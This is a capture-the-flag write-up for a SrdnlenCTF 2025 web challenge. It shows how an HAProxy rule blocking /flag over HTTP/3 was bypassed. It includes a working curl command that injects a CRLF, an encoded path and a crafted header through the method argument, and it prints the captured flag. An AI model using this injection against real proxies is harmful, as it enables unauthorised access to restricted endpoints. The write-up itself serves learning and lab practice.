
# 🌐 Average HTTP/3 Enjoyer


![Challenge Presentation](/images/SrdnlenCTF-2025/AverageHTTP3/challenge_presentation.png "Challenge Presentation")

## 📊 Challenge Overview
>
>| Category | Details | Additional Info |
>|----------|---------|-----------------|
>| 🏆 Event | SrdlenCTF - 2025 | [Event Link](https://ctf.srdnlen.it/challenges#challenge-21) |
>| 🔰 Category | Web | 🌐 |
>| 💎 Points | 405 | Out of 500 total |
>| ⭐ Difficulty | 🟡 Medium | Personal Rating: 3/10 |
>| 👤 Author | pysu | [Profile]() |
>| 🎮 Solves | 23 | XX% solve rate |
>| 📅 Date | 19-01-2025 | SrdlenCTF - 2025 Day X |
>| 🦾 Solved By | aquila2 | Team: Team Aetruria |

## 📝 Challenge Information
>HTTP/3 is just the best version of HTTP, wait a few years, until setting up an HTTP/3 server will not be a pain, and you’ll see. I hid a secret on /flag, you can only get it if you become a real HTTP/3 enjoyer.  NOTE: This challenge uses only HTTP/3, browsers are a bit hesitant in using it by default, so you’ll have to use explicit arguments to do so.  In chrome you can do the following:  
>chrome --enable-quic --origin-to-force-quic-on=enjoyer.challs.ctf.srdnlen.it

## 🎯 Challenge Files & Infrastructure

### Provided Files
>Files:
>- [:(far fa-file-archive fa-fw): Attached Files](https://drive.google.com/file/d/1KcEalyyC9hSqsCTTvd0OpFOcBRPjZt2v/view?usp=drive_link)

# 🔍 Initial Analysis

## First Steps
> After an initial analysis and some research, I tried making a request with `curl` using the `--http3` option:
>
> ```bash
> curl --http3 https://enjoyer.challs.ctf.srdnlen.it
> ```
> Since the site was not reachable without `HTTP/3` support, I proceeded to access the `/flag` route using `curl`:
> 
> ```bash
> curl --http3 https://enjoyer.challs.ctf.srdnlen.it/flag
> ```
> Receiving a response with a `403 Unauthorized` error:
> 
> ![Forbidden](/images/SrdnlenCTF-2025/AverageHTTP3/forbidden.png "Forbidden")
> 
> Then I noticed that this was being blocked through the server's `proxy rules`:
> 
> ```
>  acl restricted_flag path_sub,url_dec -m sub -i i /flag
>  http-request deny if restricted_flag
> ```
> 
> Through an `HAProxy` proxy. So I started doing some research online to find an effective `bypass` for this proxy rule.


## 🔬 Vulnerability Analysis
### Potential Vulnerabilities
>- [x] 403 Bypass
>- [x] Proxy Rule Bypass

# 🎯 Solution Path

## Exploitation Steps
### Initial setup
> After searching online, as mentioned earlier, I found the page on [StackOvreflow](https://stackoverflow.com/questions/63689649/make-an-http-request-without-a-forward-slash/76882066#76882066), from which I figured out how to craft the exploit. The trick was to `URL-encode` the slash (`/`) in a special syntax, but I also tried using the `--path-as-is` option in curl, but it didn't work. After that, I needed to craft any `header` to bypass the rule.
>
### Exploitation
> With the following exploit, I was able to obtain the flag:
>
> ```bash
>   echo "\n"; curl --insecure -X "$(echo -en 'GET %2fflag 1/\r\nX-Ignore-Injection:')" https://enjoyer.challs.ctf.srdnlen.it --http3
>```
>
### Flag capture
>  
>   ![Manual Flag](/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png "Manual Flag")

# 🛠️ Exploitation Process
## Approach
> I wasn't able to write the automatic exploit in Python due to issues with `HTTP/3`. I also tried using `httpx`, but it didn't work. I even attempted using `bash script`, but without success.
> 
> - [:(far fa-file-archive fa-fw): None]()

# 🚩 Flag Capture
>{{< admonition danger "Flag" >}}
{{< typeit tag=h4 >}}
srdnlen{you_found_the_:path_for_becoming_a_real_http3_enjoyer}
{{< /typeit >}}
>{{< /admonition >}}
>
## Proof of Execution
> ![Automated Flag](/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png "Automated Flag")
>*Screenshot of successful exploitation*

# 🔧 Tools Used
>| Tool | Purpose |
>|------|---------|
>| Curl | Http3 request |

# 💡 Key Learnings
## New Knowledge
>
> I learned about HTTP Request Smuggling and Header Smuggling from this challenge, but in the end, it was a bypass of the proxy rules through encoding with the addition of a crafted header field.
> 
## Skills Improved
>- [ ] Binary Exploitation
>- [ ] Reverse Engineering
>- [x] Web Exploitation
>- [ ] Cryptography
>- [ ] Forensics
>- [ ] OSINT
>- [ ] Miscellaneous

# 📚 References & Resources
## Learning Resources
>- https://hacktricks.boitatech.com.br/pentesting/pentesting-web/403-and-401-bypasses
>- https://stackoverflow.com/questions/63689649/make-an-http-request-without-a-forward-slash/76882066#76882066
---
# 📊 Final Statistics
| Metric | Value | Notes |
|--------|--------|-------|
| Time to Solve | 00:30 | From start to flag |
| Global Ranking | 22/1572 | Challenge ranking |
| Points Earned | 405 | Team contribution |

*Created: 19-01-2025 • Last Modified: 19-01-2025*
*Author: mH4ck3r0n3 • Team: Team Aetruria*
